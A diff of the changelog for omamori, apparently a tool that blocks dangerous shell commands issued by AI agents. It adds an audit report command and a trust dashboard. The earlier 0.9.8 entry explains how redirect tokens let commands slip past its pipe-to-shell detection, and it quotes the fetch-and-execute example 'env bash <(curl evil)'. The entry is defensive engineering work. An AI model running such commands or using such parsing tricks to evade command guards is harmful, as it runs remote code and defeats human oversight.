@@ -4,6 +4,44 @@ All notable changes to this project will be documented in this file.
 
 The format is based on Keep a Changelog.
 
+## [0.10.0] - 2026-05-04
+
+**Summary**: Verifiability release — `omamori report` audit aggregation subcommand ([#221](https://github.com/yottayoshida/omamori/issues/221)) and `omamori doctor` trust dashboard restructure ([#220](https://github.com/yottayoshida/omamori/issues/220)). The report subcommand surfaces block counts by layer/provider, unknown-tool fail-open counts, and hash-chain integrity status over a configurable time window (1d–90d). The doctor command is restructured from a flat checklist into a 4-section trust dashboard (Layer 1 → Layer 2 → Integrity → Recent risk signals) with a top-line `Protection status: OK / WARN / FAIL` verdict and a new `--json` summary block for programmatic consumption. Together these close the verifiability gap: users can now answer "is omamori working?" (doctor) and "what has omamori done?" (report) without reading raw audit logs.
+
+### Added
+
+- **`omamori report` subcommand** ([#221](https://github.com/yottayoshida/omamori/issues/221)). Read-only audit log aggregation. `--last <duration>` (1d–90d, default 7d), `--json` (7-field stable schema: `period_days`, `actual_window_days`, `total_blocks`, `by_layer`, `by_provider`, `chain_status`, `unknown_tool_fail_opens`), `--verbose` (adds chain-break sequence detail). No AI environment guard — consistent with `audit show` / `audit unknown` precedent. Per-rule breakdowns deliberately excluded from report output to avoid exposing attack optimization information; use `audit show --rule <name>` for per-rule investigation.
+- **`ReportAggregate` aggregation library** in `src/audit/report.rs`. `aggregate_report(&AuditConfig, days) -> ReportAggregate` with `open_read_nofollow` symlink defense (SEC-R10), shared reader discipline with `verify_chain` (SEC-R11), graceful fallback on read/parse failure (zeros + Unavailable). `ChainStatus` enum with `#[serde(skip_serializing)]` on `at_seq` field (SEC-R8). `classify_layer` function buckets `detection_layer` values into `layer1` / `layer2` / `shape-routing` / `unclassified` with strict colon-delimited prefix matching to prevent false classification.
+- **`omamori doctor` trust dashboard** ([#220](https://github.com/yottayoshida/omamori/issues/220)). Top-line `Protection status: OK / WARN / FAIL` verdict. 4-section grouping: `[Layer 1]` (Shims + PATH), `[Layer 2]` (Hooks), `[Integrity]` (Config + Core Policy + Baseline), `[Recent risk signals]` (block count, unknown-tool fail-opens, audit chain status from `aggregate_report`). Section-level status indicators (OK/WARN/FAIL per section).
+- **`omamori doctor --json` summary block**. `summary` object at top level with `protection_status`, `layer1`, `layer2`, `integrity` fields. Existing `items[]` array preserved for backward compatibility.
+- **`DoctorSection` enum** in `src/cli/checks_display.rs`. 4 variants (`Layer1`, `Layer2`, `Integrity`, `RiskSignals`) with `group_by_section()` classifier mapping existing check labels to sections. Shared between human and JSON output paths.
+- **ACCEPTANCE_TEST.md D-5/D-6/D-7** (doctor trust dashboard) and **Rep-1 through Rep-8** (report subcommand). Rep-3 verifies SEC-R2 7-field JSON schema with `jq` assertion. Rep-7 verifies SEC-R8 chain_status 3-state. Rep-8 verifies `by_rule` absence.
+- **SECURITY.md `### Report Read Access (v0.10.0+)`**. Documents same-user OS threat model extension, 7-field schema boundary, provider aggregation channel separation, accepted risk of AI agent polling.
+
+### Changed
+
+- **`omamori doctor` output restructured** from flat checklist to 4-section trust dashboard. Top-line verdict is now `Protection status: OK / WARN / FAIL` instead of the previous summary line. Section headers `[Layer 1]`, `[Layer 2]`, `[Integrity]`, `[Recent risk signals]` group related checks. **This is a breaking change for scripts parsing doctor output** — use `--json` for stable programmatic access.
+- **ACCEPTANCE_TEST.md D-1 assertion updated**: `stdout ~~ /healthy/` → `stdout ~~ /Protection status: OK/` to match the new trust dashboard format.
+
+### Fixed
+
+- **`aggregate_events` action string mismatch** (discovered via Codex R1). The aggregation function checked `event.action == "deny"` but the audit writer uses `"block"` (both Layer 1 `ActionKind::Block.as_str()` and Layer 2 `hook.rs` audit path). Report would have returned 0 blocks on all real audit data. Fixed to `event.action == "block"`.
+- **`classify_layer` false prefix matching**. `starts_with("layer2")` would have matched hypothetical values like `"layer20"` or `"layer2evil"`. Fixed to `dl == "layer2" || dl.starts_with("layer2:")` with strict colon delimiter, matching the `detection_layer` taxonomy defined in `hook.rs::VALID_DETECTION_LAYERS_STATIC`.
+
+### For users
+
+- **New command**: `omamori report` — run after `omamori doctor` to see what omamori has been doing. `omamori report` for a quick 7-day summary, `omamori report --last 30d` for a month, `omamori report --json` for machine-readable output.
+- **Doctor output changed**: `omamori doctor` now shows a trust dashboard with `Protection status: OK / WARN / FAIL` at the top. If you parse doctor output in scripts, switch to `omamori doctor --json` which provides a stable `summary` object.
+- No installation change required. `brew upgrade omamori` followed by any shim invocation auto-syncs as before.
+- macOS-only. v0.10.0 introduces no platform expansion.
+- Existing `audit.jsonl` continues to verify against the same hash chain; `CHAIN_VERSION` is unchanged.
+
+### PRs
+
+- [#223](https://github.com/yottayoshida/omamori/pull/223) — `feat(audit): add report aggregation library (#221)`. New `src/audit/report.rs` module with `aggregate_report`, `ReportAggregate`, `ChainStatus`, `classify_layer`. 9 unit tests.
+- [#224](https://github.com/yottayoshida/omamori/pull/224) — `feat(doctor): restructure display as 4-section trust dashboard (#220)`. New `src/cli/checks_display.rs` with `DoctorSection` enum and `group_by_section()`. Doctor output restructured. `--json` summary block added. 19 unit tests.
+- [#225](https://github.com/yottayoshida/omamori/pull/225) — `feat(report): add omamori report subcommand (#221)`. New `src/cli/report.rs` with CLI, duration parser, human/JSON output. Bug fixes for action string mismatch and classify_layer prefix. Docs updates (README, SECURITY.md, ACCEPTANCE_TEST.md). 20 unit tests. Codex R1 exhaustive → R2 Approve + 6-B adversarial 5 blind spots addressed.
+
 ## [0.9.8] - 2026-05-01
 
 **Summary**: Layer 2 redirect-axis closure ([#212](https://github.com/yottayoshida/omamori/issues/212)). The 2-boolean redirect classifier (`is_pure_redirect_op` / `is_concatenated_redirect`) carried in v0.9.5-v0.9.7 proved structurally insufficient under AI agent invocation: redirect operators with operand arity (e.g. `&>>` taking a file path operand) were misclassified as concatenated single-token redirects, letting downstream stdin-signal flags (`-s`) reach as if they were script paths and bypassing pipe-to-shell detection (Layer 2). v0.9.8 PR2 replaces both booleans with a single `RedirectToken::{PureWithOperand, Concatenated, NotRedirect}` enum carrying explicit `token_span()` arity, used uniformly across `unwrap_transparent`, `strip_leading_noise`, and the new arity-aware skip in `classify_shell_args`. Single-digit fd prefixes (`0<` ... `9>`, including `2<>file` etc.) are handled via `strip_single_fd_digit` reclassification, automatically closing the V-028 enumeration gap surfaced during plan loop. V-027 (proc-sub + transparent wrapper, e.g. `env bash <(curl evil)`) was confirmed already correct in v0.9.7 (the proc-sub guard in `process_segment` runs post-`unwrap_transparent`); v0.9.8 closes the test gap by adding 9 wrappers × proc-sub regression cases to `HOOK_DECISION_CASES`. Plus PR1 ([#213](https://github.com/yottayoshida/omamori/issues/213)) ACCEPTANCE_TEST.md AI-orchestrator framing rewrite landed earlier — the structural fix that closes the discovery gap that let v0.9.7 ship with #212 in the first place.
